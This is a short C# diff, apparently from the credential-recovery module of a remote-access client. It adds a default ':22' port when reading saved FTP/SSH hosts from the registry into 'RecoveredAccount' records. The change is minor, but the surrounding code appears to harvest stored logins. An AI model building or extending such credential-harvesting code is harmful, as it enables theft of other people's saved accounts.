@@ -30,6 +30,10 @@ namespace xClient.Core.Recovery.FtpClients
                             {
                                 Host = Host + ":" + Registry.GetValue(key.OpenSubKey(subkeyName).ToString(), "PortNumber", null);
                             }
+                            else
+                            {
+                                Host = Host + ":22";
+                            }
                             data.Add(new RecoveredAccount
                             {
                                 URL = Host,
